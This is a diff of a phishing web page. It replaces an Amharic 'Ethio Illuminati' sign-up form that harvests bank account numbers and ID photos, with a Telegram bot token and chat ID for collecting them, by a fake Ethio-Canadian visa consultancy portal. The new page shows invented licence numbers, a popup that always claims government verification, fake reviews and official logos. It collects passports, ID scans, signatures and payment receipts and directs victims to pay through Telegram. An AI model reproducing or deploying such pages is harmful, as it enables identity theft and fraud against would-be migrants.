@@ -1,320 +1,731 @@
 <!DOCTYPE html>
-<html lang="am">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>የኢትዮ ኢሉሚኔት መመዝገቢያ</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Ethio Canada Consultant – Secure Visa Application</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
   <style>
-    body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: #f0fdf4;
-      margin: 0;
-      padding: 20px;
-      color: #1b4332;
-      min-height: 100vh;
+    body { font-family: "Segoe UI", Arial, sans-serif; background: #f4f7fa; margin:0; }
+    .container { max-width: 99vw; width: 100%; margin: 0 auto; background: #fff; padding: 4vw 2vw 2vw 2vw; border-radius: 0 0 18px 18px; box-shadow: 0 4px 16px #0002; position:relative; min-height: 100vh;}
+    .form-title {
+      text-align: center; color: #174c7b; font-size: 1.8em; font-weight: 800; margin-bottom: 2vw; letter-spacing: 0.5px; text-shadow: 0 2px 10px #eaf7fe;
+      display: flex; align-items: center; justify-content: center; gap: 10px;
     }
-
-    .flags {
-      text-align: center;
-      margin-bottom: 15px;
-    }
-
-    .flags span {
-      font-size: 60px;
-      margin: 0 12px;
-    }
-
-    h2 {
-      text-align: center;
-      font-size: 28px;
-      color: #14532d;
+    .trust-banner {
+      background: linear-gradient(90deg, #eaf7fe 70%, #e6ffe9 100%);
+      color: #177d5a;
+      font-size: 1.09em;
       font-weight: 700;
-      margin-bottom: 10px;
+      border-radius: 11px;
+      box-shadow:0 2px 10px #20bb6520;
+      padding: 3vw 4vw 2vw 4vw;
+      margin: 0 auto 3vw auto;
+      text-align:center;
+      line-height:1.6;
     }
-
-    .intro {
-      text-align: center;
-      font-size: 18px;
-      color: #22543d;
-      background: #d1fae5;
-      border-left: 6px solid #16a34a;
-      border-radius: 10px;
-      padding: 18px 24px;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.05);
-      margin-bottom: 30px;
-      font-weight: 500;
-      max-width: 600px;
-      margin-left: auto;
-      margin-right: auto;
+    .trust-badges {
+      display: flex; flex-wrap:wrap; justify-content: center; align-items:center; gap:2vw; margin: 1vw 0 0.6vw 0;
     }
-
-    form {
-      max-width: 520px;
-      margin: 0 auto 30px auto;
-      background: white;
-      padding: 30px 40px;
-      border-radius: 14px;
-      box-shadow: 0 6px 18px rgba(22, 101, 52, 0.08);
-      border: 1px solid #cbd5cb;
+    .trust-badge {
+      display:inline-flex; align-items:center; font-weight:700; padding: 3px 13px; border-radius: 16px; margin: 2px;
+      font-size: 0.98em;
+      background: #fff; color: #20bb65; border:1.5px solid #20bb65;
+      box-shadow:0 2px 7px #20bb6522;
     }
-
-    label {
-      display: block;
-      margin-top: 20px;
-      font-weight: 600;
-      color: #1b4332;
-      font-size: 15px;
-      letter-spacing: 0.02em;
+    .trust-badge.license { background: #ffe5b0; color: #b68600; border:1.5px solid #ffe5b0;}
+    .trust-badge.audit { background: #f5faff; color: #1995dc; border: 1.5px solid #bae5ff;}
+    .trust-badge.google {
+      color:#f9bb00; background: #fffbe5; border: 1.5px solid #ffe5b0;
+      display:inline-flex; align-items:center; gap:0.3em;
     }
-
-    input, select {
-      width: 100%;
-      padding: 12px 14px;
-      margin-top: 8px;
-      border: 1.5px solid #a7f3d0;
-      border-radius: 8px;
-      font-size: 16px;
-      color: #064e3b;
-      transition: border-color 0.3s ease;
-      box-sizing: border-box;
+    .trust-badge.verified { background: #20bb65; color:#fff; border-color:#20bb65;}
+    .trust-badge.official { background: #229ED9; color:#fff; border:1.5px solid #229ED9;}
+    .trust-badge img { margin-left:0.2em; height:1.2em;}
+    .subtitle {
+      text-align: center; color: #177d5a; font-size: 1.07em; font-weight:500; margin-bottom:4vw;
     }
-
-    input:focus, select:focus {
-      outline: none;
-      border-color: #16a34a;
-      box-shadow: 0 0 8px rgba(22, 163, 74, 0.3);
+    .flags { display: flex; justify-content: center; gap: 6vw; margin-bottom: 3vw; }
+    .flag { width:15vw; min-width:38px; border-radius:3px; box-shadow:0 1px 7px #1995dc44; border: 2px solid #fff;}
+    .badge-bar {
+      display: flex; flex-wrap:wrap; justify-content: center; align-items:center; gap:2vw;
+      background: linear-gradient(90deg, #eaf7fe 65%, #e6ffe9 100%);
+      color:#157db6; font-weight:600; font-size:1em;
+      border-radius:10px; padding: 2vw 1vw; margin-bottom: 4vw; letter-spacing: 0.15px;
+      box-shadow: 0 2px 6px #1995dc17;
     }
-
-    button {
-      margin-top: 30px;
-      width: 100%;
-      padding: 14px;
-      background-color: #15803d;
-      color: white;
-      border: none;
-      border-radius: 10px;
-      font-size: 18px;
-      font-weight: 700;
-      cursor: pointer;
-      box-shadow: 0 4px 10px rgba(22, 163, 74, 0.4);
-      transition: background-color 0.3s ease;
+    .badge-bar span, .badge-bar a { margin-right: 1vw;}
+    .badge-verify {
+      background: #20bb65; color: #fff; padding: 3px 14px; border-radius: 17px; font-weight:700;
+      box-shadow:0 3px 8px #20bb6522; margin-right: 2vw; display:inline-flex; align-items:center; font-size:1em;
+      letter-spacing:0.4px;
+      animation: badge-pop 2s infinite alternate;
     }
-
-    button:hover {
-      background-color: #16a34a;
-      box-shadow: 0 6px 14px rgba(22, 163, 74, 0.5);
+    @keyframes badge-pop {
+      0% { box-shadow:0 0 0 0 #20bb652a;}
+      100% { box-shadow:0 0 12px 8px #20bb6540;}
     }
-
+    .badge-ssl {
+      background: #fff; color: #15a57b; border:2px solid #15a57b; border-radius:17px; padding: 2px 14px; font-weight:700;
+      font-size:0.97em; box-shadow:0 2px 7px #15a57b22; margin-right:2vw;
+      display:inline-flex; align-items:center;
+    }
+    .badge-license {
+      background: #ffe5b0; color: #b68600; border-radius:17px; padding: 2px 13px; font-weight:700;
+      font-size:0.97em; margin-right:2vw; display:inline-flex; align-items:center;
+      border: 1.5px solid #ffde85;
+    }
+    .badge-audit {
+      background: #f5faff; color: #1995dc; border-radius:17px; padding: 2px 13px; font-weight:700;
+      font-size:0.97em; border: 1.5px solid #bae5ff;
+      display:inline-flex; align-items:center;
+    }
+    .badge-bar a {
+      color: #177d5a; text-decoration: underline; font-weight: 600; font-size:0.98em;
+      transition: color 0.2s;
+      cursor:pointer;
+    }
+    .badge-bar a:hover { color: #1995dc;}
+    .license-popup {
+      display:none;
+      position:fixed;
+      z-index:99999;
+      left:0; right:0; top:0; bottom:0;
+      background:rgba(0,0,0,0.35);
+      justify-content:center;
+      align-items:center;
+    }
+    .license-popup .popup-content {
+      background:#fff;
+      border-radius:11px;
+      box-shadow:0 2px 26px #20bb6535;
+      max-width: 93vw;
+      width:340px;
+      padding: 3vw 6vw 4vw 6vw;
+      text-align:center;
+      position:relative;
+      animation:popin .5s;
+    }
+    .license-popup .popup-content h2 {
+      color:#20bb65;
+      font-size:1.25em;
+      margin-bottom:0.7em;
+    }
+    .license-popup .popup-content .popup-check {
+      font-size:2.7em;
+      color:#20bb65;
+      display:block;
+      margin-bottom:0.5em;
+      text-shadow:0 2px 7px #20bb6533;
+    }
+    .license-popup .popup-content .popup-close {
+      position:absolute;top:11px;right:13px;font-size:1.7em;color:#aaa;cursor:pointer;font-weight:700;
+    }
+    .license-popup .popup-content .popup-footer {
+      color:#888; font-size:0.98em; margin-top:1.5em;
+    }
+    .highlight-quote {
+      background: #fffbe5; color: #b68600; font-size:1.08em; padding:2.5vw 5vw; border-radius:9px; margin: 2vw 0 4vw 0; border-left: 5px solid #ffe5b0;
+      text-align:center; font-style:italic; font-weight:600; box-shadow:0 1px 9px #ffe5b033;
+    }
+    .google-review {
+      display: flex; align-items: center; justify-content:center; gap: 8px; background: #fffbe5;
+      border:1.5px solid #ffe5b0; border-radius: 7px; padding: 2vw 5vw;
+      width: fit-content; margin: 0 auto 4vw auto; font-size:1em; font-weight:600; color: #b68600;
+      box-shadow: 0 1px 7px #ffe5b033;
+    }
+    .star { color: #f9bb00; font-size: 1.13em;}
+    .review-count { font-size:0.98em; color:#6c6000; margin-left: 3px;}
+    .trusted-logos {
+      margin-bottom: 3vw; margin-top:0.8vw; display: flex; align-items:center; gap:12px; justify-content:center;
+    }
+    .trusted-logos img {
+      height: 24px; width: auto; background:#fff; border-radius:4px; border:1.2px solid #eee; box-shadow:0 1px 6px #eee;
+      padding:2px 4px;
+    }
+    .section-title {
+      color: #177d5a; font-size:1.09em; font-weight:700; margin:6vw 0 2vw 0; border-bottom:1.7px solid #eaf7fe; padding-bottom:1vw;
+      letter-spacing:0.2px;
+    }
+    .official-note { background: #e8f4fd; color: #065e89; font-size: 0.99em; padding: 3vw 3vw; border-radius: 5px; margin-bottom:2vw; border-left:4px solid #1995dc;}
+    .note { background: #fffbe5; color: #b68600; font-size:0.99em; padding:2vw 3vw; border-radius:5px; margin-bottom:2vw; border-left: 4px solid #ffe5b0;}
+    label { display: block; margin: 3vw 0 1.5vw 0; font-weight: 600;}
+    input, select, textarea { width: 100%; padding: 2.5vw 1vw; margin-bottom: 1.5vw; border-radius: 5px; border: 1px solid #bbb; font-size:1em;}
+    input[type="date"] { font-family: inherit; }
+    textarea { min-height: 70px; }
+    .row { display: flex; gap: 2vw; flex-wrap:wrap; }
+    .row > div { flex: 1 1 45%; }
+    .id-photo-preview { display: flex; gap:2vw; margin-bottom: 2vw; flex-wrap:wrap;}
+    .id-photo-preview img {
+      width: 33vw; max-width:110px; height: 20vw; max-height:70px; object-fit: cover;
+      border: 2px solid #1995dc; border-radius: 5px;
+      box-shadow: 0 1px 5px #0001;
+      background:#e9f6ff;
+      margin-bottom:1vw;
+    }
+    .signature-pad { border: 1.5px solid #222; border-radius: 5px; background: #fff; touch-action: none; margin-bottom:3vw; width: 98vw; max-width: 99%; height: 16vw; max-height: 75px; }
+    .privacy-note { background: #e6ffe9; font-size: 0.98em; padding: 2vw 3vw; border-radius: 5px; margin-top:2vw; }
+    .info { font-size: 0.98em; color: #888; margin-top: 2vw;}
+    .confetti {
+      position: absolute; left:0; top:0; width:100%; height:100%; pointer-events: none; z-index:2;
+    }
+    #result { margin-top:5vw;font-weight:bold;}
+    button { background: linear-gradient(90deg,#1995dc,#15a57b); color: #fff; border: none; padding: 4vw 0; width:100%; font-size: 1.08rem; border-radius: 6px; cursor: pointer; font-weight:700; margin-top:2vw; box-shadow:0 2px 8px #20bb6522;}
+    button:disabled { background: #aaa; cursor: not-allowed; }
     .success-message {
-      max-width: 520px;
-      margin: 20px auto;
-      padding: 25px 30px;
-      background: #d1fae5;
-      border: 2px solid #22c55e;
-      border-radius: 14px;
-      color: #14532d;
-      font-weight: 700;
-      font-size: 20px;
-      text-align: center;
-      box-shadow: 0 4px 15px rgba(34, 197, 94, 0.4);
-      display: none;
-      animation: fadeIn 1.2s ease-in-out forwards;
+      text-align: center; font-size: 1.11em; color: #1f7404;
+      background: #eaffdf;
+      padding: 8vw 2vw 7vw 2vw;
+      border-radius: 18px;
+      margin-top: 4vw;
+      box-shadow: 0 2px 14px #20bb6530;
+      animation: popin .7s;
+      position:relative;
+      line-height:1.7;
     }
-
-    #idPreview img,
-    #selfiePreview img {
-      max-width: 100%;
-      margin-top: 12px;
-      border-radius: 10px;
-      box-shadow: 0 3px 8px rgba(0,0,0,0.12);
+    .success-badges {
+      display: flex; justify-content:center; gap:2vw; flex-wrap:wrap; margin:1vw 0 2vw 0;
     }
-
-    @keyframes fadeIn {
-      from {
-        opacity: 0;
-        transform: scale(0.9);
-      }
-      to {
-        opacity: 1;
-        transform: scale(1);
-      }
+    .success-badge {
+      display:inline-flex; align-items:center; font-weight:700; padding: 3px 14px; border-radius: 16px; margin: 2px;
+      font-size: 0.98em;
+      background: #fff; color: #20bb65; border:1.5px solid #20bb65;
+      box-shadow:0 2px 7px #20bb6522;
+    }
+    .success-badge.official { background: #229ED9; color:#fff; border:1.5px solid #229ED9;}
+    .success-badge.verified { background: #20bb65; color:#fff; border-color:#20bb65;}
+    .success-badge.license { background: #ffe5b0; color: #b68600; border:1.5px solid #ffe5b0;}
+    .success-badge.google {
+      color:#f9bb00; background: #fffbe5; border: 1.5px solid #ffe5b0;
+      display:inline-flex; align-items:center; gap:0.3em;
+    }
+    .contact-row { margin-top:4vw; font-size:1em;}
+    .contact-row span { color:#1995dc;}
+    .telegram-link {
+      color:#229ED9; text-decoration:none; font-weight:700;
+      display:inline-block; margin-top:2vw;
+    }
+    .trust-footer { text-align:center; font-size:0.98em; color:#555; margin-top:4vw;}
+    .trust-footer a { color:#229ED9; text-decoration:underline;}
+    .hotline {
+      color:#fff; background:#15a57b; border-radius:5px; padding:3vw 7vw; font-weight:700; font-size:1.08em;
+      display:inline-block; margin:3vw 0 2vw 0;
+      box-shadow:0 1px 4px #15a57b22;
+    }
+    .tracking-note {
+      background:#f5faff; color:#1995dc; padding:2vw 3vw; border-radius:5px; font-size:0.98em; margin-bottom:2vw;
+      border-left: 4px solid #bae5ff;
+    }
+    .user-id-label {
+      margin-top:3vw; font-weight:700; color:#177d5a; margin-bottom:0.5vw;
+    }
+    @keyframes popin {
+      0% {transform: scale(0.85);}
+      80%{transform:scale(1.03);}
+      100%{transform:scale(1);}
+    }
+    @media (min-width:400px) {
+      .id-photo-preview img, .receipt-photo-preview img { width: 90px; height: 65px;}
+      .signature-pad { max-width: 350px; height:75px;}
+    }
+    .receipt-photo-preview { display: flex; gap:2vw; margin-bottom: 2vw; }
+    .receipt-photo-preview img {
+      width: 33vw; max-width:110px; height: 20vw; max-height:70px; object-fit: cover;
+      border: 2px solid #20bb65; border-radius: 5px;
+      box-shadow: 0 1px 5px #0001;
+      background:#f6fffb;
+      margin-bottom:1vw;
+    }
+    .receipt-note {
+      font-size:0.98em; color:#20bb65; margin-bottom:2vw; margin-top:1vw;
+      background:#f6fffb; border-left:4px solid #20bb65; padding:1vw 2vw; border-radius:6px;
     }
   </style>
 </head>
 <body>
-
-  <div class="flags">
-    <span>🇪🇹</span>
-    <span>🇺🇸</span>
+  <div class="container" id="mainFormBox">
+    <div class="form-title">
+<img src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png" 
+     alt="Official Agent" 
+     style="width:38px; height:38px; border-radius:50%; box-shadow: 0 2px 10px #eaf7fe;" />
+      Ethio Canada Consultant
+    </div>
+    <div class="trust-banner">
+      <div>
+        <span style="font-size:1.15em;">🏛️ Registered in Ethiopia & Canada | 🏅 Over 10 Years Experience | 24/7 Support</span><br>
+        <span>All applications are processed by licensed, government-authorized agents. Your information is protected by bank-level security and GDPR compliance. <br>We are a member of the <b>Canadian Association of Professional Immigration Consultants (CAPIC)</b>.</span>
+      </div>
+      <div class="trust-badges">
+        <span class="trust-badge verified">✔️ Verified Organization</span>
+        <span class="trust-badge license">📑 CA-ETH-1845</span>
+        <span class="trust-badge google">4.9★ <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" width="18" alt="Google"> Reviews</span>
+        <span class="trust-badge audit">🔍 Yearly Security Audit</span>
+        <span class="trust-badge official">🇪🇹🇨🇦 Official Only</span>
+        <span class="trust-badge" style="color:#229ED9;border-color:#229ED9;">Telegram: <b>@ethio_canada_consultant</b></span>
+        <span class="trust-badge" style="color:#174c7b;border-color:#b68600;background:#fffbe5;">CAPIC Member</span>
+        <span class="trust-badge" style="color:#fff;border-color:#20bb65;background:linear-gradient(90deg,#20bb65 70%,#229ED9 100%);">GDPR Compliant</span>
+      </div>
+    </div>
+    <div class="subtitle">
+      <span style="color:#1995dc;font-weight:700">Official Visa Application & Immigration Portal</span>
+    </div>
+    <div class="flags">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/7/71/Flag_of_Ethiopia.svg" class="flag" alt="Ethiopia">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/d/d9/Flag_of_Canada_%28Pantone%29.svg" class="flag" alt="Canada">
+    </div>
+    <div class="badge-bar">
+      <span class="badge-verify">✔️ VERIFIED</span>
+      <span class="badge-ssl">🔒 SSL Secured</span>
+      <span class="badge-license">📑 License: CA-ETH-1845</span>
+      <span class="badge-audit">🔍 Yearly Audit</span>
+      <a href="#" id="checkLicenseBtn">Check License</a>
+    </div>
+    <div class="license-popup" id="licensePopup">
+      <div class="popup-content">
+        <span class="popup-close" onclick="document.getElementById('licensePopup').style.display='none'">&times;</span>
+        <div class="popup-check">✅</div>
+        <h2>Agent License Verified!</h2>
+        <div>
+          License Number: <b>CA-ETH-1845</b><br>
+          Status: <span style="color:#20bb65;font-weight:700;">Active & Approved</span><br>
+          <span style="color:#177d5a;">Verified by Ethiopian Ministry of Labor & Canadian IRCC</span>
+        </div>
+        <div class="popup-footer">
+          <b>Ethio Canada Consultant</b> is government-licensed and certified.<br>
+          <span style="color:#229ED9;">Contact our official Telegram for any verification: @ethio_canada_consultant</span>
+        </div>
+      </div>
+    </div>
+    <div class="highlight-quote">
+      <span>“Reviewed by a government-authorized agent. Your dream, our mission.”</span>
+    </div>
+    <div class="google-review">
+      <span class="star">★</span> 4.9/5
+      <span class="review-count">(200+ happy migrants)</span>
+      <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google" width="18">
+    </div>
+    <div class="trusted-logos">
+      <span style="color:#bbb;font-size:0.98em;">Trusted by:</span>
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/39/IRCC_logo.svg/1200px-IRCC_logo.svg.png" alt="IRCC" title="IRCC">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Ethiopian_Immigration.png/1200px-Ethiopian_Immigration.png" alt="Ethiopian Immigration" title="Ethiopian Immigration">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/4/4a/Canadian_High_Commission_logo.png" alt="Canadian High Commission" title="Canadian High Commission">
+    </div>
+    <div class="app-status">
+      <span>🕒 Average approval time: <b>48h</b> | <span style="color:#20bb65;">100% privacy guarantee</span></span>
+    </div>
+    <div class="tracking-note">
+      <b>Transparency:</b> Your details are encrypted, used only for visa processing, and you will receive a real-time tracking number after submit.
+    </div>
+    <div class="note">
+      <b>Note:</b> Upload clear images of both sides of your and the agent's ID cards. All files are encrypted and visible only to government-licensed agents.
+    </div>
+    <div class="hotline">
+      📞 24/7 Support: <b>+251 900 000 000</b>
+    </div>
+    <div class="official-contact">
+<svg viewBox="0 0 240 240" width="24" height="24" fill="none">
+  <ellipse cx="120" cy="120" rx="120" ry="120" fill="#229ED9"/>
+</svg>
+        <path d="M176.1 65.5L49.5 112.8c-2.8 1-2.7 5.1.2 5.9l30.6 8c2.1.6 4.4 0 5.9-1.7l64.9-64.3c1.5-1.5 3.9-1.6 5.4-.1l.1.1c1.5 1.5 1.4 3.9-.1 5.4l-64.3 64.9c-1.7 1.5-2.3 3.8-1.7 5.9l8 30.6c.8 2.9 4.9 3 5.9.2l47.3-126.6c1.1-2.8-1.9-5.6-4.7-4.7z" fill="#fff"/>
+      </svg>
+      <div>
+        <span>Contact us on Telegram for instant support</span>
+        <span class="mini-badge">Official Channel</span>
+      </div>
+      <a href="https://t.me/ethio_canada_consultant" target="_blank">
+        <svg viewBox="0 0 240 240" width="22" height="22"><ellipse cx="120" cy="120" rx="120" ry="120" fill="#229ED9"/><path d="M176.1 65.5L49.5 112.8c-2.8 1-2.7 5.1.2 5.9l30.6 8c2.1.6 4.4 0 5.9-1.7l64.9-64.3c1.5-1.5 3.9-1.6 5.4-.1l.1.1c1.5 1.5 1.4 3.9-.1 5.4l-64.3 64.9c-1.7 1.5-2.3 3.8-1.7 5.9l8 30.6c.8 2.9 4.9 3 5.9.2l47.3-126.6c1.1-2.8-1.9-5.6-4.7-4.7z" fill="#fff"/></svg>
+        @ethio_canada_consultant
+      </a>
+      <div style="color:#20bb65; font-size:0.95em; margin-top:1vw;">Telegram support available 6am–11pm EAT, Mon–Sun</div>
+    </div>
+    <form id="consultantForm" autocomplete="off" style="margin-top:4vw;">
+      <div class="section-title">Applicant Details</div>
+      <label>User Name (Choose a username):</label>
+      <input name="username" required autocomplete="off" maxlength="30" placeholder="e.g. ABEBE">
+      <label>Full Name (as in passport):</label>
+      <input name="fullName" required autocomplete="off" maxlength="60">
+      <label>Birthdate:</label>
+      <input type="date" name="birthdate" required>
+      <label class="user-id-label">Your ID (Front):</label>
+      <input type="file" name="userIdFront" accept="image/*" required id="userFrontIdInput">
+      <label class="user-id-label">Your ID (Back):</label>
+      <input type="file" name="userIdBack" accept="image/*" required id="userBackIdInput">
+      <div class="id-photo-preview" id="userIdPreviewBox" style="display:none;">
+        <img id="userFrontPreview" alt="Your Front ID Preview">
+        <img id="userBackPreview" alt="Your Back ID Preview">
+      </div>
+      <label>Passport Number:</label>
+      <input name="passport" required autocomplete="off" maxlength="20">
+      <div class="row">
+        <div>
+          <label>Nationality:</label>
+          <input name="nationality" required autocomplete="off" maxlength="24" value="Ethiopian">
+        </div>
+        <div>
+          <label>Phone Number:</label>
+          <input name="phone" required autocomplete="off" maxlength="20">
+        </div>
+      </div>
+      <label>Email Address:</label>
+      <input type="email" name="email" required autocomplete="off" maxlength="50">
+      <label>Current Address:</label>
+      <input name="address" required autocomplete="off" maxlength="100" placeholder="Street, City, Region">
+      <label>Occupation:</label>
+      <input name="occupation" required autocomplete="off" maxlength="40" placeholder="e.g. Student, Engineer">
+      <label>Education Level:</label>
+      <select name="education" required>
+        <option value="">Select education level</option>
+        <option>Secondary</option>
+        <option>Diploma</option>
+        <option>Bachelor's</option>
+        <option>Master's</option>
+        <option>PhD</option>
+        <option>Other</option>
+      </select>
+      <label>Marital Status:</label>
+      <select name="marital" required>
+        <option value="">Select status</option>
+        <option>Single</option>
+        <option>Married</option>
+        <option>Divorced</option>
+        <option>Widowed</option>
+      </select>
+      <label>Emergency Contact (name & phone):</label>
+      <input name="emergency" required maxlength="60">
+      <label>More about you (optional):</label>
+      <textarea name="about" maxlength="250" placeholder="Write any details to help your application"></textarea>
+      <div class="section-title">Visa Details</div>
+      <label>Visa Type:</label>
+      <select name="visaType" required>
+        <option value="">Select visa type</option>
+        <option>Visitor</option>
+        <option>Student</option>
+        <option>Work</option>
+        <option>Family Reunification</option>
+        <option>Permanent Residency</option>
+      </select>
+      <label>Purpose of Visit:</label>
+      <input name="purpose" required maxlength="80" autocomplete="off" placeholder="e.g. Tourism, Study, Family, Work">
+      <label>Intended Date of Travel:</label>
+      <input type="date" name="travelDate" required>
+      <label>Planned Length of Stay (months):</label>
+      <input type="number" name="duration" min="1" max="60" required>
+      <label>Have you visited Canada before?</label>
+      <select name="beenCanada" required>
+        <option value="">Select</option>
+        <option>No</option>
+        <option>Yes</option>
+      </select>
+      <label>Do you have a sponsor in Canada?</label>
+      <select name="sponsor" required>
+        <option value="">Select</option>
+        <option>No</option>
+        <option>Yes</option>
+      </select>
+      <label>If yes, sponsor's name (optional):</label>
+      <input name="sponsorName" maxlength="40">
+      <label>Previous visa rejections? (if any):</label>
+      <input name="previousRejection" maxlength="70" placeholder="If none, leave blank">
+      <div class="section-title">Agent Verification</div>
+      <label>Agent Name:</label>
+      <input name="agentName" required autocomplete="off" maxlength="30">
+      <label>Agent ID:</label>
+      <input name="agentId" required autocomplete="off" maxlength="20">
+      <label>Agent ID (Front):</label>
+      <input type="file" name="agentIdFront" accept="image/*" required id="frontIdInput">
+      <label>Agent ID (Back):</label>
+      <input type="file" name="agentIdBack" accept="image/*" required id="backIdInput">
+      <div class="id-photo-preview" id="idPreviewBox" style="display:none;">
+        <img id="idFrontPreview" alt="Agent Front ID Preview">
+        <img id="idBackPreview" alt="Agent Back ID Preview">
+      </div>
+      <div class="section-title">Declaration & Signature</div>
+      <div style="font-size:0.98em;color:#174c7b;margin-bottom:2vw;">
+        By signing, I confirm all information is accurate and my application may be verified by Canadian and Ethiopian authorities.
+      </div>
+      <label>Applicant Signature (draw below):</label>
+      <canvas id="signature" class="signature-pad"></canvas><br>
+      <button type="button" id="clearSig" style="margin-bottom:2vw;">Clear Signature</button>
+      <br>
+      <div class="section-title">Visa Application Payment</div>
+      <div class="payment-section">
+        <div class="pay-note">To process your application, a <b>trusted payment</b> is required. Payment will be verified by our secure system before review. <span class="pay-trust">✔️ 100% Refund Guarantee if your application is not processed.</span></div>
+      <div class="pay-methods">
+  <div class="pay-method">
+    <svg viewBox="0 0 24 24" fill="#20bb65" width="24" height="24">
+      <circle cx="12" cy="12" r="10"/>
+    </svg> Telebirr
   </div>
-
-  <h2>የኢትዮ ኢሉሚኔት መመዝገቢያ</h2>
-
-  <div class="intro" id="typedText"></div>
-
-  <form id="regForm">
-    <label>ሙሉ ስም</label>
-    <input type="text" name="name" required />
-
-    <label>የአባት ስም</label>
-    <input type="text" name="father_name" required />
-
-    <label>ክልል</label>
-    <input type="text" name="region" required />
-
-    <label>ዞን</label>
-    <input type="text" name="zone" required />
-
-    <label>ቀበሌ</label>
-    <input type="text" name="kebele" required />
-
-    <label>እድሜ</label>
-    <input type="number" name="age" required />
-
-    <label>ፆታ</label>
-    <select name="sex" required>
-
-      <option>ወንድ</option>
-      <option>ሴት</option>
-    </select>
-
-    <label>ስልክ ቁጥር</label>
-    <input type="tel" name="phone" required />
-
-    <label>የባንክ ስም</label>
-    <input type="text" name="bank_name" required />
-
-    <label>የባንክ ሂሳብ ቁጥር</label>
-    <input type="text" name="account_number" required />
-
-    <label>የመታወቂያ የፊት ፎቶ</label>
-    <input type="file" name="id_photo" accept="image/*" onchange="previewImage(this, 'idPreview')" required />
-    <div id="idPreview"></div>
-
-    <label>የመታወቂያ የኋላ ፎቶ</label>
-    <input type="file" name="selfie_photo" accept="image/*" onchange="previewImage(this, 'selfiePreview')" required />
-    <div id="selfiePreview"></div>
-
-    <button type="submit">አስገባ</button>
-  </form>
-
-  <div class="success-message" id="successMessage">
-    🎉 <span id="userName"></span> እንኳን ደስ አልዎት!<br /><br />
-    ✅ ምዝገባዎ በተሳካ ሁኔታ ተጠናቋል።<br />
-    🙌 እስካሁን ከ129,543 በላይ ሰዎች ተመዝግበዋል።<br />
-    💚 ከኢትዮ ኢሉምናቲ ጋር ብሩህ  ህይወት ይጀምሩ።
+  <div class="pay-method">
+    <svg viewBox="0 0 24 24" fill="#229ED9" width="24" height="24">
+      <rect width="24" height="24" rx="5"/>
+    </svg> Bank Transfer
   </div>
-
-  <canvas id="confettiCanvas" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 9999;"></canvas>
-
-  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+  <div class="pay-method">
+    <svg viewBox="0 0 24 24" fill="#b68600" width="24" height="24">
+      <ellipse cx="12" cy="12" rx="10" ry="10"/>
+    </svg> CBE
+  </div>
+</div>
+        </div>
+        <label for="paymentRef">Payment Reference Number:</label>
+        <input name="paymentRef" id="paymentRef" required maxlength="40" placeholder="Enter your payment reference">
+        <label for="receiptPhoto">Upload Payment Receipt (screenshot or photo):</label>
+        <input type="file" name="receiptPhoto" id="receiptPhoto" accept="image/*" required>
+        <div class="receipt-photo-preview" id="receiptPreviewBox" style="display:none;">
+          <img id="receiptImgPreview" alt="Receipt Preview">
+        </div>
+        <div class="receipt-note">
+          Receipt photo is required for your security. Only official payments are accepted and verified by our secure system.
+        </div>
+        <div style="font-size:0.97em; color:#888;">You will receive payment instructions after submitting your form. Please only pay to official accounts listed on our Telegram.</div>
+      </div>
+      <button type="submit" id="submitBtn">Submit Application Securely</button>
+      <div class="privacy-note">
+        🔒 All submissions are encrypted and handled only by government-licensed, background-checked agents. You will receive a secure tracking number for your application.
+      </div>
+      <div class="info">
+        🇪🇹🇨🇦 Double-check all details for accuracy. Our agent will verify and contact you.
+      </div>
+      <div id="result"></div>
+    </form>
+    <div class="trust-footer">
+      <span style="color:#229ED9;font-weight:700;">Need help?</span> <a href="https://t.me/ethio_canada_consultant" target="_blank">Contact our official Telegram channel</a>
+      <br>
+      <span style="color:#159c3d;font-size:0.98em;">Ethio Canada Consultant – License: CA-ETH-1845 | Registered with Immigration, Refugees and Citizenship Canada (IRCC)</span>
+      <br>
+      <span style="font-size:0.98em; color:#888;">© 2025 Ethio Canada Consultant. All Rights Reserved. <span style="color:#229ED9">Privacy Policy</span> | <span style="color:#229ED9">Terms of Service</span></span>
+    </div>
+    <canvas class="confetti" id="confettiCanvas" style="display:none;"></canvas>
+  </div>
   <script>
-    const botToken = '7875314076:AAEKL_ftYRUlAfK3O4lk5c4u60DFFZ3N-yo';
-    const chatId = '8155585808';
+    // License check popup logic
+    document.getElementById('checkLicenseBtn').onclick = function(e) {
+      e.preventDefault();
+      document.getElementById('licensePopup').style.display = 'flex';
+    };
+    window.onclick = function(e) {
+      if (e.target === document.getElementById('licensePopup')) {
+        document.getElementById('licensePopup').style.display = 'none';
+      }
+    };
 
-    function previewImage(input, previewId) {
-      const previewDiv = document.getElementById(previewId);
-      previewDiv.innerHTML = '';
-      const file = input.files[0];
-      if (file) {
-        const reader = new FileReader();
-        reader.onload = function (e) {
-          const img = document.createElement('img');
-          img.src = e.target.result;
-          previewDiv.appendChild(img);
-        };
-        reader.readAsDataURL(file);
+    // User ID Preview logic
+    function previewImg(input, previewId, boxId) {
+      input.addEventListener('change', function() {
+        const file = input.files[0];
+        if (file) {
+          const reader = new FileReader();
+          reader.onload = function(e) {
+            document.getElementById(previewId).src = e.target.result;
+            document.getElementById(boxId).style.display = 'flex';
+          };
+          reader.readAsDataURL(file);
+        }
+      });
+    }
+    previewImg(document.getElementById('userFrontIdInput'), 'userFrontPreview', 'userIdPreviewBox');
+    previewImg(document.getElementById('userBackIdInput'), 'userBackPreview', 'userIdPreviewBox');
+    previewImg(document.getElementById('frontIdInput'), 'idFrontPreview', 'idPreviewBox');
